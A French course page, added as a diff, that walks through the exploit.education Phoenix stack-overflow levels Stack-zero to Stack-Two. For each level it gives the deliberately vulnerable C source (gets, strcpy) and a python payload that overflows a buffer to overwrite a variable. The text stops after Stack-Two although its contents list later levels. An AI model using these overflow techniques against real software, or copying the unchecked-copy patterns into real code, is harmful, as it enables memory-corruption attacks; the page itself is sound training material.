@@ -1,0 +1,894 @@
+
+<!DOCTYPE html>
+
+
+<html lang="fr" data-content_root="./" >
+
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <title>Tape3 &#8212; ASMx86_64</title>
+  
+  
+  
+  <script data-cfasync="false">
+    document.documentElement.dataset.mode = localStorage.getItem("mode") || "";
+    document.documentElement.dataset.theme = localStorage.getItem("theme") || "";
+  </script>
+  <!--
+    this give us a css class that will be invisible only if js is disabled
+  -->
+  <noscript>
+    <style>
+      .pst-js-only { display: none !important; }
+
+    </style>
+  </noscript>
+  
+  <!-- Loaded before other Sphinx assets -->
+  <link href="_static/styles/theme.css?digest=8878045cc6db502f8baf" rel="stylesheet" />
+<link href="_static/styles/pydata-sphinx-theme.css?digest=8878045cc6db502f8baf" rel="stylesheet" />
+
+    <link rel="stylesheet" type="text/css" href="_static/pygments.css?v=8f2a1f02" />
+    <link rel="stylesheet" type="text/css" href="_static/styles/sphinx-book-theme.css?v=a3416100" />
+    <link rel="stylesheet" type="text/css" href="_static/css/mystyle.css?v=90afad5e" />
+  
+  <!-- So that users can add custom icons -->
+  <script src="_static/scripts/fontawesome.js?digest=8878045cc6db502f8baf"></script>
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="_static/scripts/bootstrap.js?digest=8878045cc6db502f8baf" />
+<link rel="preload" as="script" href="_static/scripts/pydata-sphinx-theme.js?digest=8878045cc6db502f8baf" />
+
+    <script src="_static/documentation_options.js?v=a1409530"></script>
+    <script src="_static/doctools.js?v=9bcbadda"></script>
+    <script src="_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="_static/scripts/sphinx-book-theme.js?v=887ef09a"></script>
+    <script src="_static/translations.js?v=e6b791cb"></script>
+    <script>DOCUMENTATION_OPTIONS.pagename = 'Tape3';</script>
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Recherche" href="search.html" />
+    <link rel="prev" title="Les fonctions en x86_64" href="x86_64-LesFonctions.html" />
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="docsearch:language" content="fr"/>
+  <meta name="docsearch:version" content="" />
+  </head>
+  
+  
+  <body data-bs-spy="scroll" data-bs-target=".bd-toc-nav" data-offset="180" data-bs-root-margin="0px 0px -60%" data-default-mode="">
+
+  
+  
+  <div id="pst-skip-link" class="skip-link d-print-none"><a href="#main-content">Passer au contenu principal</a></div>
+  
+  <div id="pst-scroll-pixel-helper"></div>
+  
+  <button type="button" class="btn rounded-pill" id="pst-back-to-top">
+    <i class="fa-solid fa-arrow-up"></i>Haut de page</button>
+
+  
+  <dialog id="pst-search-dialog">
+    
+<form class="bd-search d-flex align-items-center"
+      action="search.html"
+      method="get">
+  <i class="fa-solid fa-magnifying-glass"></i>
+  <input type="search"
+         class="form-control"
+         name="q"
+         placeholder="Search..."
+         aria-label="Search..."
+         autocomplete="off"
+         autocorrect="off"
+         autocapitalize="off"
+         spellcheck="false"/>
+  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
+</form>
+  </dialog>
+
+  <div class="pst-async-banner-revealer d-none">
+  <aside id="bd-header-version-warning" class="d-none d-print-none" aria-label="Alerte de version"></aside>
+</div>
+
+  
+    <header class="bd-header navbar navbar-expand-lg bd-navbar d-print-none">
+    </header>
+  
+
+  <div class="bd-container">
+    <div class="bd-container__inner bd-page-width">
+      
+      
+      
+      <dialog id="pst-primary-sidebar-modal"></dialog>
+      <div id="pst-primary-sidebar" class="bd-sidebar-primary bd-sidebar">
+        
+
+  
+  <div class="sidebar-header-items sidebar-primary__section">
+    
+    
+    
+    
+  </div>
+  
+    <div class="sidebar-primary-items__start sidebar-primary__section">
+        <div class="sidebar-primary-item">
+
+  
+    
+  
+
+<a class="navbar-brand logo" href="index.html">
+  
+  
+  
+  
+  
+  
+    <p class="title logo__title">ASMx86_64</p>
+  
+</a></div>
+        <div class="sidebar-primary-item">
+
+<button class="btn search-button-field search-button__button pst-js-only" title="Recherche" aria-label="Recherche" data-bs-placement="bottom" data-bs-toggle="tooltip">
+ <i class="fa-solid fa-magnifying-glass"></i>
+ <span class="search-button__default-text">Recherche</span>
+ <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd class="kbd-shortcut__modifier">K</kbd></span>
+</button></div>
+        <div class="sidebar-primary-item"><nav class="bd-links bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item navbar-nav active">
+        <p aria-level="2" class="caption" role="heading"><span class="caption-text">Notions préalables</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="Rappels-Syst%C3%A8me.html">Rappels OS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Rappels-Compilation.html">Rappels sur la compilation avec gcc</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Syntaxe et bases de l'assembleur x86_64</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="x86_64-LesSyntaxes.html">Les syntaxes AT&amp;T et Intel</a></li>
+<li class="toctree-l1"><a class="reference internal" href="x86_64-LesBases.html">Les registres et l’adressage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="x86_64-LesFonctions.html">Les fonctions en x86_64</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Travaux pratiques</span></p>
+<ul class="current nav bd-sidenav">
+<li class="toctree-l1 current active"><a class="current reference internal" href="#">Tape3</a></li>
+</ul>
+
+    </div>
+</nav></div>
+    </div>
+  
+  
+  <div class="sidebar-primary-items__end sidebar-primary__section">
+      <div class="sidebar-primary-item">
+<div id="ethical-ad-placement"
+      class="flat"
+      data-ea-publisher="readthedocs"
+      data-ea-type="readthedocs-sidebar"
+      data-ea-manual="true">
+</div></div>
+  </div>
+
+
+      </div>
+      
+      <main id="main-content" class="bd-main" role="main">
+        
+        
+
+<div class="sbt-scroll-pixel-helper"></div>
+
+          <div class="bd-content">
+            <div class="bd-article-container">
+              
+              <div class="bd-header-article d-print-none">
+<div class="header-article-items header-article__inner">
+  
+    <div class="header-article-items__start">
+      
+        <div class="header-article-item"><button class="sidebar-toggle primary-toggle btn btn-sm" title="Toggle primary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+  <span class="fa-solid fa-bars"></span>
+</button></div>
+      
+    </div>
+  
+  
+    <div class="header-article-items__end">
+      
+        <div class="header-article-item">
+
+<div class="article-header-buttons">
+
+
+
+
+
+<div class="dropdown dropdown-download-buttons">
+  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Téléchargez cette page">
+    <i class="fas fa-download"></i>
+  </button>
+  <ul class="dropdown-menu">
+      
+      
+      
+      <li><a href="_sources/Tape3.md" target="_blank"
+   class="btn btn-sm btn-download-source-button dropdown-item"
+   title="Télécharger le fichier source"
+   data-bs-placement="left" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-file"></i>
+  </span>
+<span class="btn__text-container">.md</span>
+</a>
+</li>
+      
+      
+      
+      
+      <li>
+<button onclick="window.print()"
+  class="btn btn-sm btn-download-pdf-button dropdown-item"
+  title="Imprimer au format PDF"
+  data-bs-placement="left" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-file-pdf"></i>
+  </span>
+<span class="btn__text-container">.pdf</span>
+</button>
+</li>
+      
+  </ul>
+</div>
+
+
+
+
+<button onclick="toggleFullScreen()"
+  class="btn btn-sm btn-fullscreen-button"
+  title="Mode plein écran"
+  data-bs-placement="bottom" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+
+
+<button class="btn btn-sm nav-link pst-navbar-icon theme-switch-button pst-js-only" aria-label="Thème" data-bs-title="Thème"  data-bs-placement="bottom" data-bs-toggle="tooltip">
+  <i class="theme-switch fa-solid fa-sun                fa-lg" data-mode="light" title="Clair"></i>
+  <i class="theme-switch fa-solid fa-moon               fa-lg" data-mode="dark"  title="Sombre"></i>
+  <i class="theme-switch fa-solid fa-circle-half-stroke fa-lg" data-mode="auto"  title="Paramètres système"></i>
+</button>
+
+
+<button class="btn btn-sm pst-navbar-icon search-button search-button__button pst-js-only" title="Recherche" aria-label="Recherche" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <i class="fa-solid fa-magnifying-glass fa-lg"></i>
+</button>
+<button class="sidebar-toggle secondary-toggle btn btn-sm" title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="fa-solid fa-list"></span>
+</button>
+</div></div>
+      
+    </div>
+  
+</div>
+</div>
+              
+              
+
+<div id="jb-print-docs-body" class="onlyprint">
+    <h1>Tape3</h1>
+    <!-- Table of contents -->
+    <div id="print-main-content">
+        <div id="jb-print-toc">
+            
+            <div>
+                <h2> Contenu </h2>
+            </div>
+            <nav aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mise-en-route">Mise en route</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#notes-importantes">Notes importantes</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#rappels-gdb">Rappels gdb</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-zero">Stack-zero</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-one">Stack-one</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-two">Stack-Two</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-three">Stack-Three</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-four">Stack-Four</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-five">Stack-Five</a></li>
+</ul>
+            </nav>
+        </div>
+    </div>
+</div>
+
+              
+                
+<div id="searchbox"></div>
+                <article class="bd-article">
+                  
+  <section id="tape3">
+<h1>Tape3<a class="headerlink" href="#tape3" title="Lien vers cette rubrique">#</a></h1>
+<section id="mise-en-route">
+<h2>Mise en route<a class="headerlink" href="#mise-en-route" title="Lien vers cette rubrique">#</a></h2>
+<ul class="simple">
+<li><p>Télécharger la vm amd64 <a class="reference external" href="https://exploit.education/downloads/">ici</a>, qemu aussi si vous ne l’avez pas, <a class="reference external" href="https://www.tecmint.com/install-qemu-kvm-ubuntu-create-virtual-machines/">debian</a>, <a class="reference external" href="https://www.howtoforge.com/how-to-install-kvm-qemu-on-manjaro-archlinux/%5D">arch</a>.</p></li>
+<li><p>Pour nix-os utilisez une nix shell `nix-shell -p qemu ».</p></li>
+<li><p>Lancez le script <code class="docutils literal notranslate"><span class="pre">boot-exploit-education-phoenix-amd64.sh</span></code>.</p></li>
+<li><p>Utilisez le login <code class="docutils literal notranslate"><span class="pre">user</span></code> et le mot de passe <code class="docutils literal notranslate"><span class="pre">user</span></code>.</p></li>
+<li><p>Faite <code class="docutils literal notranslate"><span class="pre">ssh</span> <span class="pre">-p2222</span> <span class="pre">user&#64;localhost</span></code> dans un autre <strong>terminal</strong> pour avoir une meilleure expérience.</p></li>
+<li><p>Vous trouverez les fichiers exécutables dans <code class="docutils literal notranslate"><span class="pre">/opt/phoenix/amd64/</span></code>.</p></li>
+</ul>
+</section>
+<section id="notes-importantes">
+<h2>Notes importantes<a class="headerlink" href="#notes-importantes" title="Lien vers cette rubrique">#</a></h2>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">volatile</span></code> est pour forcer le compilateur à ne pas optimiser la variable, et de toujours la mettre à jour en mémoire.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&quot;\x&quot;</span></code> permet d’écrire des chaines de caractères en utilisant des hexadicimaux: <code class="docutils literal notranslate"><span class="pre">&quot;\x30\x30&quot;</span> <span class="pre">==</span> <span class="pre">&quot;00&quot;</span></code>.</p></li>
+<li><p>Une variable en bash ne peut pas stocker le caractère <code class="docutils literal notranslate"><span class="pre">'\x00'</span></code> (Stack-Five et Stack-Six).</p></li>
+</ul>
+<section id="rappels-gdb">
+<h3>Rappels gdb<a class="headerlink" href="#rappels-gdb" title="Lien vers cette rubrique">#</a></h3>
+<ul class="simple">
+<li><p>La VM utilise <strong>gef</strong> (gdb enhanced features) pour faciliter l’utilisation de gdb.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">start</span></code> est l’équivalent de <code class="docutils literal notranslate"><span class="pre">run</span></code> avec un breakpoint sur <code class="docutils literal notranslate"><span class="pre">main()</span></code>. Vu que le binaire ne contient pas assez de symboles pour le débugage, on ne peut faire des breakpoints que sur des adresses.</p>
+<ul>
+<li><p>gef permet d’utiliser une syntaxe plus simple avec le nom de la fonction, ex: <code class="docutils literal notranslate"><span class="pre">b</span> <span class="pre">*start_level</span></code>.</p></li>
+<li><p>Ne pas oublier l’astérisque avant l’adresse pour les breakpoints!!</p></li>
+</ul>
+</li>
+<li><p>Pour donner un input au programme sur gdb on utilise la syntaxe <code class="docutils literal notranslate"><span class="pre">start&lt;</span> <span class="pre">&lt;(echo</span> <span class="pre">-ne</span> <span class="pre">&quot;Hello&quot;)</span></code>, on peut utiliser <code class="docutils literal notranslate"><span class="pre">run</span></code> à la place pour ne pas s’arrêter au <code class="docutils literal notranslate"><span class="pre">main()</span></code>.</p></li>
+<li><p>On peut avoir l’assembleur d’une fonction en utilisant la commande <code class="docutils literal notranslate"><span class="pre">disassemble</span></code>, exemple: <code class="docutils literal notranslate"><span class="pre">disassemble</span> <span class="pre">start_level</span></code> donnera le code assembleur de la fonction <code class="docutils literal notranslate"><span class="pre">start_level</span></code>. C’est plus pratique sur la VM vu que <code class="docutils literal notranslate"><span class="pre">objdump</span> <span class="pre">--disassemble=start_level</span></code> n’est pas supporté par cette dernière.</p></li>
+</ul>
+</section>
+</section>
+<section id="stack-zero">
+<h2>Stack-zero<a class="headerlink" href="#stack-zero" title="Lien vers cette rubrique">#</a></h2>
+<ul class="simple">
+<li><p>Le code:</p></li>
+</ul>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="cp">#define BANNER \</span>
+<span class="cp">  &quot;Welcome to &quot; LEVELNAME &quot;, brought to you by https:</span><span class="c1">//exploit.education&quot;</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="nf">gets</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">);</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="w">    </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">changeme</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">locals</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BANNER</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">locals</span><span class="p">.</span><span class="n">changeme</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">buffer</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">changeme</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Well done, the &#39;changeme&#39; variable has been changed!&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span>
+<span class="w">        </span><span class="s">&quot;Uh oh, &#39;changeme&#39; has not yet been changed. Would you like to try &quot;</span>
+<span class="w">        </span><span class="s">&quot;again?&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Le fait de déclarer <code class="docutils literal notranslate"><span class="pre">buffer</span></code> et <code class="docutils literal notranslate"><span class="pre">changeme</span></code> dans une struct, permet d’être sûr que les 64 caractères de <code class="docutils literal notranslate"><span class="pre">buffer</span></code> précèderont l’entier <code class="docutils literal notranslate"><span class="pre">changeme</span></code>.</p></li>
+<li><p>Ajoutant à cela le fait que l’implémentation <code class="docutils literal notranslate"><span class="pre">gets</span></code> simpliste permet d’écrire autant d’octets qu’on veut (segfault si elle arrive à une adresse interdite).</p></li>
+<li><p>Ainsi, en écrivant plus de 64 octets, on va modifier la valeur de <code class="docutils literal notranslate"><span class="pre">changeme</span></code>.</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(&quot;E&quot;*64+&quot;\x10\x20\x30\40&quot;)&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/opt/phoenix/amd64/stack-zero<span class="w"> </span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Welcome to phoenix/stack-zero, brought to you by https://exploit.education
+Well done, the &#39;changeme&#39; variable has been changed!
+</pre></div>
+</div>
+<center><div class="figure-container-small">
+<figure class="figure"> 
+<img src="./_static/images/phoenix/stack-zero.png"/>
+</figure>
+<figcaption>Disposition de la structure en mémoire.</figcaption>
+</div></center>
+<blockquote>
+<div><p>Remarquez que la valeur de <strong>changme</strong> est inversée, vu qu’on écrit depuis l’adresse basse à l’adresse haute, et que l’architecture amd64 suit le schéma <strong>little-endian</strong>.</p>
+</div></blockquote>
+</section>
+<section id="stack-one">
+<h2>Stack-one<a class="headerlink" href="#stack-one" title="Lien vers cette rubrique">#</a></h2>
+<ul class="simple">
+<li><p>Le code:</p></li>
+</ul>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;err.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="cp">#define BANNER \</span>
+<span class="cp">  &quot;Welcome to &quot; LEVELNAME &quot;, brought to you by https:</span><span class="c1">//exploit.education&quot;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="w">    </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">changeme</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">locals</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BANNER</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;specify an argument, to be copied into the </span><span class="se">\&quot;</span><span class="s">buffer</span><span class="se">\&quot;</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">locals</span><span class="p">.</span><span class="n">changeme</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">changeme</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x496c5962</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Well done, you have successfully set changeme to the correct value&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Getting closer! changeme is currently 0x%08x, we want 0x496c5962</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="n">locals</span><span class="p">.</span><span class="n">changeme</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>On a toujours la même struct, mais ici on doit passer l’argument <code class="docutils literal notranslate"><span class="pre">argv[1]</span></code> et faire en sorte d’avoir une valeur spécifique pour <code class="docutils literal notranslate"><span class="pre">changeme</span></code>.</p>
+<ul>
+<li><p>La fonction <code class="docutils literal notranslate"><span class="pre">strcpy</span></code> est tout aussi naïve que <code class="docutils literal notranslate"><span class="pre">gets</span></code>, elle ne s’arrête qu’au caractère <code class="docutils literal notranslate"><span class="pre">0x00</span></code> contrairement à <code class="docutils literal notranslate"><span class="pre">strncpy</span></code> qui accepte un troisième argument représentant le nombre de caractères à copier.</p></li>
+</ul>
+</li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span>/opt/phoenix/amd64/stack-one<span class="w"> </span><span class="k">$(</span><span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(&quot;E&quot;*64+&quot;\x62\x59\x6c\x49&quot;)&#39;</span><span class="k">)</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Welcome</span> <span class="n">to</span> <span class="n">phoenix</span><span class="o">/</span><span class="n">stack</span><span class="o">-</span><span class="n">one</span><span class="p">,</span> <span class="n">brought</span> <span class="n">to</span> <span class="n">you</span> <span class="n">by</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">exploit</span><span class="o">.</span><span class="n">education</span>
+<span class="n">Well</span> <span class="n">done</span><span class="p">,</span> <span class="n">you</span> <span class="n">have</span> <span class="n">successfully</span> <span class="nb">set</span> <span class="n">changeme</span> <span class="n">to</span> <span class="n">the</span> <span class="n">correct</span> <span class="n">value</span>
+</pre></div>
+</div>
+</section>
+<section id="stack-two">
+<h2>Stack-Two<a class="headerlink" href="#stack-two" title="Lien vers cette rubrique">#</a></h2>
+<ul class="simple">
+<li><p>Le code:</p></li>
+</ul>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;err.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="cp">#define BANNER \</span>
+<span class="cp">  &quot;Welcome to &quot; LEVELNAME &quot;, brought to you by https:</span><span class="c1">//exploit.education&quot;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="w">    </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">changeme</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">locals</span><span class="p">;</span>
+
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BANNER</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;ExploitEducation&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ptr</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;please set the ExploitEducation environment variable&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">locals</span><span class="p">.</span><span class="n">changeme</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">changeme</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x0d0a090a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Well done, you have successfully set changeme to the correct value&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Almost! changeme is currently 0x%08x, we want 0x0d0a090a</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="n">locals</span><span class="p">.</span><span class="n">changeme</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Même idée que stack-one, on a juste à exporter la variable d’environnement <code class="docutils literal notranslate"><span class="pre">ExploitEducation</span></code> avec la chaine de caractères nécessaire.</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">ExploitEducation</span><span class="o">=</span><span class="k">$(</span><span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(&quot;E&quot;*64+&quot;\x0a\x09\x0a\x0d&quot;)&#39;</span><span class="k">)</span><span class="w">  </span>
+user@phoenix-amd64:~$<span class="w"> </span>/opt/phoenix/amd64/stack-two<span class="w"> </span>
+</pre></div>
+</div>
